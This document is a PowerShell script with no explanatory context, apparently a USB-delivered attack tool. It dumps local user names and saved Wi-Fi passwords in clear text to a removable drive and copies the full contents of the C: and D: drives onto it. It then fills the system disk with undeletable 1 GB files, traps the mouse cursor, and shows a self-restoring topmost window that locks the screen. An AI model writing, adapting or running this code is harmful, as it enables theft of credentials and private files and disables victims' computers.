Add-Type -AssemblyName System.Windows.Forms

Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class UserInputBlocker {
    [DllImport("user32.dll")]
    public static extern bool ClipCursor(ref RECT lpRect);

    [DllImport("user32.dll")]
    public static extern bool ClipCursor(IntPtr lpRect);

    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);

    [StructLayout(LayoutKind.Sequential)]
    public struct RECT {
        public int Left;
        public int Top;
        public int Right;
        public int Bottom;
    }
}
"@

$usbDrive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -First 1 -ExpandProperty DeviceID
if (-not $usbDrive) { exit }
$usbPath = "$usbDrive\"
$dataPath = Join-Path $usbPath "data"
if (-not (Test-Path $dataPath)) { New-Item -ItemType Directory -Path $dataPath | Out-Null }
try { Get-LocalUser | Select-Object Name, Enabled | Out-File -FilePath (Join-Path $dataPath "local_users.txt") } catch { "Error" | Out-File -FilePath (Join-Path $dataPath "error_log.txt") }
function Test-Admin { $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()); return $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator) }
if (Test-Admin) {
    $wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
    $output = ""
    foreach ($profile in $wifiProfiles) {
        $key = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
        if ($key) { $output += "SSID: $profile, Password: $key`n" } else { $output += "SSID: $profile, Password: (None)`n" }
    }
    $output | Out-File -FilePath (Join-Path $dataPath "wifi_passwords.txt")
} else {
    "No admin rights for wifi passwords." | Out-File -FilePath (Join-Path $dataPath "wifi_passwords.txt")
}
$backupPathC = Join-Path $dataPath "backup_C"
if (-not (Test-Path $backupPathC)) { New-Item -ItemType Directory -Path $backupPathC | Out-Null }
try { Copy-Item -Path "C:\" -Destination $backupPathC -Recurse -ErrorAction SilentlyContinue } catch {}
if (Test-Path "D:\") {
    $backupPathD = Join-Path $dataPath "backup_D"
    if (-not (Test-Path $backupPathD)) { New-Item -ItemType Directory -Path $backupPathD | Out-Null }
    try { Copy-Item -Path "D:\" -Destination $backupPathD -Recurse -ErrorAction SilentlyContinue } catch {}
}
$fileSizeBytes = 1GB
$i = 1
while ($true) {
    $filePath = "C:\dummyfile_$i.bin"
    if (-not (Test-Path $filePath)) {
        try {
            $fs = [System.IO.File]::Create($filePath)
            $fs.SetLength($fileSizeBytes)
            $fs.Close()
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true
            $acl = Get-Acl $filePath
            $denyDelete = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","Delete","Deny")
            $acl.AddAccessRule($denyDelete)
            Set-Acl -Path $filePath -AclObject $acl
            $i++
        } catch { break }
    } else { $i++ }
}
"Done: $(Get-Date)" | Out-File -FilePath (Join-Path $dataPath "log.txt") -Append
$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$rect = New-Object UserInputBlocker+RECT
$rect.Left = $screenWidth - 100
$rect.Top = 0
$rect.Right = $screenWidth
$rect.Bottom = 100
[UserInputBlocker]::ClipCursor([ref]$rect)
$form = New-Object System.Windows.Forms.Form
$form.Text = "COSMOS"
$form.Width = 10000
$form.Height = 10000
$form.StartPosition = "CenterScreen"
$form.Topmost = $true
$form.Show()
while ($true) {
    Start-Sleep -Milliseconds 15
    for ($key=0; $key -lt 256; $key++) {
        [UserInputBlocker]::GetAsyncKeyState($key) | Out-Null
    }
    if ($form.WindowState -eq 'Minimized') { $form.WindowState = 'Normal' }
    if (-not $form.Visible) { $form.Show() }
    $form.TopMost = $true
    [System.Windows.Forms.Application]::DoEvents()
}
